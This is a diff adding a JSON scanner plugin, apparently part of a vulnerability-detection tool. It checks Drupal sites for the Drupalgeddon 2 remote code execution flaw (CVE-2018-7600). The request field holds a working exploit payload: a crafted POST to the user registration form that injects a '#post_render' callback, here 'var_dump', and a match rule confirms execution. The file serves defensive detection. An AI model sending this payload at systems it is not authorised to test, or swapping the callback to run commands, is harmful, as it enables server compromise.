@@ -1,0 +1,23 @@
+{
+    "target":"drupal",
+    "meta":{
+        "name":    "Drupal Drupalgeddon 2 远程代码执行漏洞",
+        "remarks": "6/7/8版本的Form API中存在一处远程代码执行漏洞，可导致服务器直接被入侵控制。",
+        "level":   0,
+        "type":    "RCE",
+        "author":   "wolf",
+        "references": {
+            "url":"https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md",
+            "cve":"CVE-2018-7600",
+            "kpid":"KP-0057"
+        }
+    },
+    "request":{
+        "path":     "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+        "postData": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=var_dump&mail[#type]=markup&mail[#markup]=test"
+    },
+    "verify":{
+        "type":  "string",
+        "match": "string(4) \"test\""
+    }
+}
